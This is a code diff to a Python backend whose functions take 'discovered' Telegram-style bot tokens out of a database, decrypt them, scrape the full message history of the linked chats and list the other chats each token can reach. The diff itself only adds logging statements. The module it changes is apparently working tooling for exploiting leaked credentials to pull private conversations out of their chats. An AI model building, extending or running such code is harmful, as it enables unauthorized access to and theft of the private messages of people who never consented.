@@ -31,26 +31,31 @@ def exfiltrate_chat(cred_id: str):
     return loop.run_until_complete(_exfiltrate_logic(cred_id))
 
 async def _exfiltrate_logic(cred_id: str):
-    logger.info(f"🕵️ [Exfil] Starting exfiltration for credential {cred_id}")
+    logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")
     
     # Local instantiation for logging
     from app.services.broadcaster_srv import BroadcasterService
     broadcaster = BroadcasterService()
     await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
+    
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
     if not response.data:
+        logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
         return f"Credential {cred_id} not found."
     
     record = response.data[0]
     encrypted_token = record["bot_token"]
     chat_id = record["chat_id"]
     
+    logger.info(f"    [Exfil] Found Chat ID: {chat_id}")
+    
     # Decrypt
     try:
         bot_token = security.decrypt(encrypted_token)
     except Exception as e:
         # Invalid token or key
+        logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Decryption failed for {cred_id}: {e}"
 
@@ -58,10 +63,13 @@ async def _exfiltrate_logic(cred_id: str):
     try:
         logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
         await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")
+        
         messages = await scraper_service.scrape_history(bot_token, chat_id)
+        
         logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
         await broadcaster.send_log(f"✅ Scraped {len(messages)} messages.")
     except Exception as e:
+        logger.error(f"❌ [Exfil] Scraper failed: {e}")
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Scraping failed: {e}"
 
@@ -118,6 +126,7 @@ async def _enrich_logic(cred_id: str):
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
     if not response.data:
+        logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
         return f"Credential {cred_id} not found."
     
     record = response.data[0]
@@ -126,6 +135,7 @@ async def _enrich_logic(cred_id: str):
     try:
         bot_token = security.decrypt(record["bot_token"])
     except Exception as e:
+        logger.error(f"❌ [Enrich] Decryption failed: {e}")
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Decryption failed: {e}"
 
@@ -137,10 +147,13 @@ async def _enrich_logic(cred_id: str):
         logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
         if chats:
             chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
+            logger.info(f"    [Enrich] Chats found: {chat_list}")
             await broadcaster.send_log(f"✅ Discovered chats: {chat_list}")
         else:
+            logger.info(f"    [Enrich] No chats found.")
             await broadcaster.send_log("⚠️ No chats found.")
     except Exception as e:
+        logger.error(f"❌ [Enrich] Discovery failed: {e}")
         return f"Discovery failed: {e}"
 
     if not chats:
